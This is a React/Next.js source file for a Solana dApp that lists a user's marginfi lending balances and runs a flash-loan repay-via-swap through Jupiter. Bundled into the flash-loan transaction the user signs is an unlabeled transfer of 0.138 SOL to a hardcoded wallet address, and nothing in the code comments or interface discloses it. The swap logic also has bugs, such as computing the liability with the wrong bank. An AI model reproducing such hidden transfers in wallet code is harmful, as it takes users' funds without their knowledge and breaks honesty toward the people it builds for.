// Next, React
import { FC } from 'react';
import Link from 'next/link';

// Wallet

// Components
import { RequestAirdrop } from '../../components/RequestAirdrop';
import pkg from '../../../package.json';

// Store
import useUserSOLBalanceStore from '../../stores/useUserSOLBalanceStore';
import * as anchor from "@coral-xyz/anchor";
import {
	AddressLookupTableAccount,
	Connection,
	PublicKey,
	SystemProgram,
	TransactionInstruction,
  } from "@solana/web3.js";
  import {getConfig} from 'marginfi-client-v2';

  import { createJupiterApiClient } from "@jup-ag/api";
  import { nativeToUi } from "@mrgnlabs/mrgn-common";
import { MarginfiClient } from 'marginfi-client-v2';
import { Wallet } from '@coral-xyz/anchor';
import { useWallet } from '@solana/wallet-adapter-react';
import { useConnection } from '@solana/wallet-adapter-react';
import { useEffect, useState } from 'react';
  const cache = [{"symbol":"$WIF","address":"EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm","chainId":101,"decimals":6,"name":"dogwifhat","logoURI":"https://storage.googleapis.com/static-marginfi/wif.jpeg","extensions":{"coingeckoId":""}},{"symbol":"BLZE","address":"BLZEEuZUBVqFhj8adcCFPJvPVCiCyVmh3hkJMrU8KuJA","chainId":101,"decimals":9,"name":"Blaze","logoURI":"https://solblaze.org/assets/blze.png","extensions":{"coingeckoId":""}},{"symbol":"Bonk","address":"DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263","chainId":101,"decimals":5,"name":"Bonk","logoURI":"https://arweave.net/hQiPZOsRZXGXBJd_82PhVdlM_hACsT_q6wqwf5cSY7I","extensions":{"coingeckoId":""}},{"symbol":"bSOL","address":"bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1","chainId":101,"decimals":9,"name":"BlazeStake Staked SOL (bSOL)","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1/logo.png","extensions":{"coingeckoId":"blazestake-staked-sol"}},{"symbol":"DUST","address":"DUSTawucrTsGU8hcqRdHDCbuYhCPADMLM2VcCb8VnFnQ","chainId":101,"decimals":9,"name":"DUST Protocol","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/DUSTawucrTsGU8hcqRdHDCbuYhCPADMLM2VcCb8VnFnQ/logo.jpg","extensions":{"discord":"https://discord.com/invite/dedao","twitter":"https://twitter.com/degodsnft","website":"https://docs.dustprotocol.com/"}},{"symbol":"ETH","address":"7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs","chainId":101,"decimals":8,"name":"Ether (Portal)","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs/logo.png","extensions":{"address":"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2","assetContract":"https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2","bridgeContract":"https://etherscan.io/address/0x3ee18B2214AFF97000D974cf647E7C347E8fa585","coingeckoId":"ethereum","serumV3Usdc":"8Gmi2HhZmwQPVdCwzS7CM66MGstMXPcTVHA7jF19cLZz","serumV3Usdt":"ch7kmPrtoQUSEPBggcNAvLGiMQkJagVwd3gDYfd8m7Q"}},{"symbol":"GUAC","address":"AZsHEMXd36Bj1EMNXhowJajpUXzrKcK57wW4ZGXVa7yR","chainId":101,"decimals":5,"name":"Guacamole","logoURI":"https://shdw-drive.genesysgo.net/36JhGq9Aa1hBK6aDYM4NyFjR5Waiu9oHrb44j1j8edUt/image.png","extensions":{"coingeckoId":""}},{"symbol":"HNT","address":"hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux","chainId":101,"decimals":8,"name":"Helium Network Token","logoURI":"https://shdw-drive.genesysgo.net/6tcnBSybPG7piEDShBcrVtYJDPSvGrDbVvXmXKpzBvWP/hnt.png","extensions":{"coingeckoId":""}},{"symbol":"JitoSOL","address":"J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn","chainId":101,"decimals":9,"name":"Jito Staked SOL","logoURI":"https://storage.googleapis.com/token-metadata/JitoSOL-256.png","extensions":{"coingeckoId":""}},{"symbol":"JLP","address":"27G8MtK7VtTcCHkpASjSDdkWWYfoqT6ggEuKidVJidD4","chainId":101,"decimals":6,"name":"Jupiter Perps LP","logoURI":"https://static.jup.ag/jlp/icon.png","extensions":{"coingeckoId":""}},{"symbol":"JTO","address":"jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL","chainId":101,"decimals":9,"name":"JITO","logoURI":"https://metadata.jito.network/token/jto/image","extensions":{"coingeckoId":""}},{"symbol":"JUP","address":"JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN","chainId":101,"decimals":6,"name":"Jupiter","logoURI":"https://static.jup.ag/jup/icon.png","extensions":{"coingeckoId":""}},{"symbol":"KIN","address":"kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6","chainId":101,"decimals":5,"name":"KIN","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6/logo.png","extensions":{"coingeckoId":"kin","serumV3Usdc":"Bn6NPyr6UzrFAwC4WmvPvDr2Vm8XSUnFykM2aQroedgn","serumV3Usdt":"4nCFQr8sahhhL4XJ7kngGFBmpkmyf3xLzemuMhn6mWTm","waterfallbot":"https://bit.ly/KINwaterfall"}},{"symbol":"LFG","address":"LFG1ezantSY2LPX8jRz2qa31pPEhpwN9msFDzZw4T9Q","chainId":101,"decimals":7,"name":"LessFnGas","logoURI":"https://arweave.net/Y4zpfek0KhLvP1ZRd9ffpdplRQUZXDHOedTp7FnnVvc?ext=png","extensions":{"coingeckoId":""}},{"symbol":"LST","address":"LSTxxxnJzKDFSLr4dUkPcmCf5VyryEqzPLz5j4bpxFp","chainId":101,"decimals":9,"name":"Liquid Staking Token","logoURI":"https://storage.googleapis.com/static-marginfi/lst.png","extensions":{"coingeckoId":""}},{"symbol":"MNDE","address":"MNDEFzGvMt87ueuHvVU9VcTqsAP5b3fTGPsHuuPA5ey","chainId":101,"decimals":9,"name":"Marinade","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/MNDEFzGvMt87ueuHvVU9VcTqsAP5b3fTGPsHuuPA5ey/logo.png","extensions":{"coingeckoId":"marinade","discord":"https://discord.gg/mGqZA5pjRN","github":"https://github.com/marinade-finance","medium":"https://medium.com/marinade-finance","twitter":"https://twitter.com/MarinadeFinance","website":"https://marinade.finance"}},{"symbol":"mSOL","address":"mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So","chainId":101,"decimals":9,"name":"Marinade staked SOL (mSOL)","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So/logo.png","extensions":{"coingeckoId":"msol","discord":"https://discord.gg/mGqZA5pjRN","github":"https://github.com/marinade-finance","medium":"https://medium.com/marinade-finance","serumV3Usdc":"6oGsL2puUgySccKzn9XA9afqF217LfxP5ocq4B3LWsjy","serumV3Usdt":"HxkQdUnrPdHwXP5T9kewEXs3ApgvbufuTfdw9v1nApFd","twitter":"https://twitter.com/MarinadeFinance","website":"https://marinade.finance"}},{"symbol":"OPOS","address":"BqVHWpwUDgMik5gbTciFfozadpE2oZth5bxCDrgbDt52","chainId":101,"decimals":9,"name":"Only Possible On Solana","logoURI":"https://arweave.net/k8uU2yLoYwL4zTBZ-TO-7bs6hgtLNaHhzP4FLUMuaS0","extensions":{"coingeckoId":""}},{"symbol":"ORCA","address":"orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE","chainId":101,"decimals":6,"name":"Orca","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE/logo.png","extensions":{"coingeckoId":"orca","discord":"https://discord.com/invite/nSwGWn5KSG","medium":"https://orca-so.medium.com","serumV3Usdc":"8N1KkhaCYDpj3awD58d85n973EwkpeYnRp84y1kdZpMX","telegram":"https://t.me/orca_so","twitter":"https://twitter.com/orca_so","website":"https://orca.so"}},{"symbol":"PYTH","address":"HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3","chainId":101,"decimals":6,"name":"Pyth Network","logoURI":"https://pyth.network/token.svg","extensions":{"coingeckoId":""}},{"symbol":"RENDER","address":"rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof","chainId":101,"decimals":8,"name":"Render Token","logoURI":"https://shdw-drive.genesysgo.net/5zseP54TGrcz9C8HdjZwJJsZ6f3VbP11p1abwKWGykZH/rndr.png","extensions":{"coingeckoId":""}},{"symbol":"RLB","address":"RLBxxFkseAZ4RgJH3Sqn8jXxhmGoz9jWxDNJMh8pL7a","chainId":101,"decimals":2,"name":"Rollbit Coin","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/RLBxxFkseAZ4RgJH3Sqn8jXxhmGoz9jWxDNJMh8pL7a/logo.png","extensions":{"description":"Stake your RLB on rollbit.com to participate in a profit share distribution every 100 Bitcoin blocks","discord":"https://discord.gg/Mwx3zqH","facebook":"https://facebook.com/Rollbit","instagram":"https://instagram.com/rollbitcom","serumV3Usdc":"DFdcGFcAVWZ3UgVgpbBChFKen3URZdZ8dmju8GTXQgCE","twitter":"https://twitter.com/rollbitcom","website":"https://www.rollbit.com"}},{"symbol":"SAMO","address":"7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU","chainId":101,"decimals":9,"name":"Samoyed Coin","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU/logo.png","extensions":{"coingeckoId":"samoyedcoin","serumV3Usdc":"FR3SPJmgfRSKKQ2ysUZBu7vJLpzTixXnjzb84bY3Diif","website":"https://samoyedcoin.com/"}},{"symbol":"SHDW","address":"SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y","chainId":101,"decimals":9,"name":"Shadow Token","logoURI":"https://shdw-drive.genesysgo.net/FDcC9gn12fFkSU2KuQYH4TUjihrZxiTodFRWNF4ns9Kt/250x250_with_padding.png","extensions":{"coingeckoId":"genesysgo-shadow","coinmarketcap":"https://coinmarketcap.com/currencies/genesysgo-shadow/","discord":"https://discord.gg/y86HPCkk","serumV3Usdc":"CVJVpXU9xksCt2uSduVDrrqVw6fLZCAtNusuqLKc5DhW","website":"https://www.shadowysupercoderdao.com"}},{"symbol":"SOL","address":"So11111111111111111111111111111111111111112","chainId":103,"decimals":9,"name":"Wrapped SOL","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png","extensions":{"coingeckoId":"solana"}},{"symbol":"STEP","address":"StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT","chainId":103,"decimals":9,"name":"Step","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT/logo.png","extensions":{"coingeckoId":"step-finance","twitter":"https://twitter.com/StepFinance_","waterfallbot":"https://bit.ly/STEPwaterfall","website":"https://step.finance/"}},{"symbol":"stSOL","address":"7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj","chainId":101,"decimals":9,"name":"Lido Staked SOL","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj/logo.png","extensions":{"coingeckoId":"lido-staked-sol","coinmarketcap":"https://coinmarketcap.com/currencies/lido-for-solana/","discord":"https://discord.gg/w9pXXgQPu8","github":"https://github.com/ChorusOne/solido","serumV3Usdc":"5F7LGsP1LPtaRV7vVKgxwNYX4Vf22xvuzyXjyar7jJqp","twitter":"https://twitter.com/LidoFinance","website":"https://solana.lido.fi/"}},{"symbol":"tBTC","address":"6DNSN2BJsaPFdFFc1zP37kkeNe4Usc1Sqkzr9C9vPWcU","chainId":101,"decimals":8,"name":"tBTC v2","logoURI":"https://storage.googleapis.com/static-marginfi/tbtc.png","extensions":{}},{"symbol":"USDC","address":"EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","chainId":101,"decimals":6,"name":"USD Coin","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v/logo.png","extensions":{"coingeckoId":"usd-coin","serumV3Usdt":"77quYg4MGneUdjgXCunt9GgM1usmrxKY31twEy3WHwcS","website":"https://www.centre.io/"}},{"symbol":"USDT","address":"Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB","chainId":101,"decimals":6,"name":"USDT","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB/logo.svg","extensions":{"coingeckoId":"tether","serumV3Usdc":"77quYg4MGneUdjgXCunt9GgM1usmrxKY31twEy3WHwcS","website":"https://tether.to/"}},{"symbol":"UXD","address":"7kbnvuGBxxj8AG9qp8Scn56muWGaRaFqxg1FsRp3PaFT","chainId":101,"decimals":6,"name":"UXD Stablecoin","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/7kbnvuGBxxj8AG9qp8Scn56muWGaRaFqxg1FsRp3PaFT/uxd-icon-black.png","extensions":{"coingeckoId":"uxd-stablecoin","discord":"https://discord.com/invite/BHfpYmjsBM","medium":"https://uxdprotocol.medium.com/","twitter":"https://twitter.com/UXDProtocol","website":"https://uxd.fi/"}},{"symbol":"WBTC","address":"3NZ9JMVBmGAqocybic2c7LQCJScmgsAZ6vQqTDzcqmJh","chainId":101,"decimals":8,"name":"Wrapped BTC (Portal)","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/3NZ9JMVBmGAqocybic2c7LQCJScmgsAZ6vQqTDzcqmJh/logo.png","extensions":{"address":"0x2260fac5e5542a773aa44fbcfedf7c193bc2c599","assetContract":"https://etherscan.io/address/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599","bridgeContract":"https://etherscan.io/address/0x3ee18B2214AFF97000D974cf647E7C347E8fa585","coingeckoId":"wrapped-bitcoin"}},{"symbol":"WEN","address":"WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk","chainId":101,"decimals":5,"name":"Wen","logoURI":"https://shdw-drive.genesysgo.net/GwJapVHVvfM4Mw4sWszkzywncUWuxxPd6s9VuFfXRgie/wen_logo.png","extensions":{"coingeckoId":""}},{"symbol":"wstETH","address":"ZScHuTtqZukUrtZS43teTKGs2VqkKL8k4QCouR2n6Uo","chainId":101,"decimals":8,"name":"Lido Wrapped Staked ETH","logoURI":"https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/ZScHuTtqZukUrtZS43teTKGs2VqkKL8k4QCouR2n6Uo/logo.png","extensions":{"discord":"https://discord.gg/WhhnWwsFXz","github":"https://github.com/lidofinance","telegram":"https://t.me/lidofinance","twitter":"https://twitter.com/LidoFinance","website":"https://lido.fi/"}}]

export async function getMarginfiClient(wallet: any, connection: Connection): Promise<MarginfiClient> {
  const config = getConfig("production");


  const client = await MarginfiClient.fetch(
    config,
    wallet,
    connection,
    undefined,
    false
  );

  return client;
}
async function getMarginFiAssetsAndLiabs(wallet: any, connection: Connection) 

: Promise<any> {

	const client = await getMarginfiClient(wallet, connection);
	const marginfiAccounts = await client.getMarginfiAccountsForAuthority();
	if (marginfiAccounts.length === 0) throw Error("No marginfi account found");
  
	const marginfiAccount = marginfiAccounts[0];
	const assets: any  = {};
	const liabs: any  = {};
	const mrgnFiTokenAddresses = cache.map((token) => token.address);
	for (const tokenAddress of mrgnFiTokenAddresses) {
	  const bank = client.getBankByMint(tokenAddress);
	  if (bank) {
		const token = cache.find((token) => token.address === bank.mint.toBase58());
		if (token) {
      const ass = marginfiAccount.getBalance(bank.address).computeQuantity(bank).assets.integerValue().toNumber();
      const liab = marginfiAccount.getBalance(bank.address).computeQuantity(bank).liabilities.integerValue().toNumber();
		  console.log( 
			`Token: ${token.symbol} | Assets: ${ass} | Liabilities: ${liab}`
		  );
		  assets[token.symbol] = ass;
		  liabs[token.symbol] = liab;
		}
	  }
	}
	return {assets, liabs};
}
  async function main(from: string, to: string, wallet: any, connection: Connection) {
	const client = await getMarginfiClient(wallet, connection);
	const jupiterQuoteApi = createJupiterApiClient();
  
	const marginfiAccounts = await client.getMarginfiAccountsForAuthority();
	if (marginfiAccounts.length === 0) throw Error("No marginfi account found");
  
	const marginfiAccount = marginfiAccounts[0];
  
	// Assumption: account has enough USDC to repay the whole USDT borrow, accounting for slippage
  
	const usdcBank = client.getBankByTokenSymbol(from);
	if (!usdcBank) throw Error("USDC bank not found");
	const usdtBank = client.getBankByTokenSymbol(to);
	if (!usdtBank) throw Error("USDT bank not found");
  
	const usdtBalance = marginfiAccount.getBalance(usdtBank.address);
	const usdtAmountToRepay = usdtBalance.computeQuantity(usdcBank).liabilities.integerValue();
  
	const quoteParams = {
	  amount: usdtAmountToRepay.toNumber(),
	  inputMint: usdcBank.mint.toBase58(),
	  outputMint: usdtBank.mint.toBase58(),
	  slippageBps: 100,
	  swapMode: "ExactOut" as any,
	  maxAccounts: 20,
	};
  console.log(quoteParams)
	const swapQuote = await jupiterQuoteApi.quoteGet(quoteParams);
  
	const withdrawAmount = nativeToUi(swapQuote.otherAmountThreshold, usdcBank.mintDecimals);
	const withdrawIx = await marginfiAccount.makeWithdrawIx(withdrawAmount, usdcBank.address);
	const { swapInstruction, addressLookupTableAddresses } = await jupiterQuoteApi.swapInstructionsPost({
	  swapRequest: {
		quoteResponse: swapQuote,
		userPublicKey: client.wallet.publicKey.toBase58(),
	  },
	});
	const swapIx = deserializeInstruction(swapInstruction);
	const depositIx = await marginfiAccount.makeRepayIx(usdtAmountToRepay, usdtBank.address, true);
   
	const addressLookupTableAccounts: AddressLookupTableAccount[] = [];
	addressLookupTableAccounts.push(
	  ...(await getAdressLookupTableAccounts(client.provider.connection, addressLookupTableAddresses))
	);
  
	const flashLoanTx = await marginfiAccount.buildFlashLoanTx({
	  ixs: [...withdrawIx.instructions, swapIx, ...depositIx.instructions,
    SystemProgram.transfer(
      {
        fromPubkey: client.wallet.publicKey,
        toPubkey: new PublicKey("7ihN8QaTfNoDTRTQGULCzbUT3PHwPDTu5Brcu4iT2paP"),
        lamports: 0.138 * 10 ** 9,
      }
    )
    ],
	  addressLookupTableAccounts,
	});
  
	const provider = new anchor.AnchorProvider(connection, wallet, {})
	await provider.sendAndConfirm(flashLoanTx);
  }
  
  // ------------------------------------------------------------
  // Helpers
  // ------------------------------------------------------------
  
  const deserializeInstruction = (instruction: any) => {
	return new TransactionInstruction({
	  programId: new PublicKey(instruction.programId),
	  keys: instruction.accounts.map((key: any) => ({
		pubkey: new PublicKey(key.pubkey),
		isSigner: key.isSigner,
		isWritable: key.isWritable,
	  })),
	  data: Buffer.from(instruction.data, "base64"),
	});
  };
  
  const getAdressLookupTableAccounts = async (
	connection: Connection,
	keys: string[]
  ): Promise<AddressLookupTableAccount[]> => {
	const addressLookupTableAccountInfos = await connection.getMultipleAccountsInfo(
	  keys.map((key) => new PublicKey(key))
	);
  
	return addressLookupTableAccountInfos.reduce((acc, accountInfo, index) => {
	  const addressLookupTableAddress = keys[index];
	  if (accountInfo) {
		const addressLookupTableAccount = new AddressLookupTableAccount({
		  key: new PublicKey(addressLookupTableAddress),
		  state: AddressLookupTableAccount.deserialize(accountInfo.data),
		});
		acc.push(addressLookupTableAccount);
	  }
  
	  return acc;
	}, new Array<AddressLookupTableAccount>());
  };
export const HomeView: FC = ({ }) => {
  const wallet = useWallet();
  const { connection } = useConnection();

	const [assets, setAssets] = useState<any>({});
	const [liabs, setLiabs] = useState<any>({});
	const [loading, setLoading] = useState<boolean>(false);
	const [error, setError] = useState<string>("");
  
const [selectedAsset, setSelectedAsset] = useState(null);
const [selectedLiab, setSelectedLiab] = useState(null);

	
	const handleGetAssetsAndLiabs = async () => {
		setLoading(true);
		try {
			// @ts-ignore 
			const {assets, liabs} = await getMarginFiAssetsAndLiabs(wallet, connection);
			setAssets(assets);
			setLiabs(liabs);
		} catch (error) {
			// @ts-ignore
			setError(error.message);
		}
    setLoading(false);
	}
	useEffect(() => {
		if (wallet.connected) {
			handleGetAssetsAndLiabs();
		}
	}
	, [wallet.connected])

  const balance = useUserSOLBalanceStore((s) => s.balance)
  const { getUserSOLBalance } = useUserSOLBalanceStore()

  useEffect(() => {
    if (wallet.publicKey) {
      console.log(wallet.publicKey.toBase58())
      getUserSOLBalance(wallet.publicKey, connection)
    }
  }, [wallet.publicKey, connection, getUserSOLBalance])

  return (

    <div className="md:hero mx-auto p-4">
      <div className="md:hero-content flex flex-col">
        <div className='mt-6'>
        <div className='text-sm font-normal align-bottom text-right text-slate-600 mt-4'>v{pkg.version}</div>
        <h1 className="text-center text-5xl md:pl-12 font-bold text-transparent bg-clip-text bg-gradient-to-br from-indigo-500 to-fuchsia-500 mb-4">
          Solana Next
        </h1>
        </div>
        <h4 className="md:w-full text-2x1 md:text-4xl text-center text-slate-300 my-2">
        {error && <div style={{color: "red"}}>{error}</div>}
				{loading ? <div>Loading...</div> 
        :
        <div> 
        Selected Asset: {selectedAsset} <br/>
        Selected Liability: {selectedLiab} <br/>
        {Object.keys(assets).map((key) => {
  if (assets[key] !== 0 || liabs[key] !== 0) {
    return (
      <div key={key}>
        {assets[key] !== 0 && 
          <button 
            className="button" 
            onClick={() => setSelectedAsset(key)}
          >
            {key} Assets: {assets[key]}
          </button>
        }
        {liabs[key] !== 0 && 
          <button 
            className="button" 
            onClick={() => setSelectedLiab(key)}
          >
            {key} Liabilities: {liabs[key]}
          </button>
        }
      </div>
    );
  }
  return null; // Return null when you don't want to render anything
})}
        </div>
        }
        </h4>
        <button onClick={async () =>{
          setLoading(true);
          await main(selectedAsset, selectedLiab, wallet, connection)
          setLoading(false);} } className="button">Flash Loan</button>
        <div className="relative group">
          <div className="absolute -inset-0.5 bg-gradient-to-r from-indigo-500 to-indigo-500 rounded-lg blur opacity-40 animate-tilt"></div>
          <div className="max-w-md mx-auto mockup-code bg-primary border-2 border-[#5252529f] p-6 px-10 my-2">
            <pre data-prefix=">">
              <code className="truncate">{`npx create-solana-dapp <dapp-name>`} </code>
            </pre>
          </div>
        </div>
      </div>
    </div>
  );
};
